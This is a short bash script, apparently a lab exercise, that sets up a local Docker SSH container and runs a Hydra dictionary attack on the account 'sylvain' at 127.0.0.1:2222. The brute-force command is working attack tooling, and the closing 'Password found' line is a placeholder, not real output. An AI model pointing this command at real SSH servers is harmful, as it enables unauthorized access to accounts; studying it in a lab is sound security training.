#!/bin/bash

# This script will perform a dictionary attack on an SSH account using Hydra.

# Step 1: Install Docker (if not already installed)
echo "Installing Docker..."
sudo apt-get update
sudo apt-get install -y docker.io

# Step 2: Pull and run the Docker image
echo "Running Docker container..."
docker run -p 2222:22 -d -ti sylvainkalache/264-1

# Step 3: Install Hydra
echo "Installing Hydra..."
sudo apt-get install -y hydra

# Step 4: Perform the dictionary attack
echo "Starting dictionary attack..."
hydra -l sylvain -P /path/to/password_dictionary.txt ssh://127.0.0.1:2222

# Step 5: Output the found password
echo "Password found: <insert_password_here>"

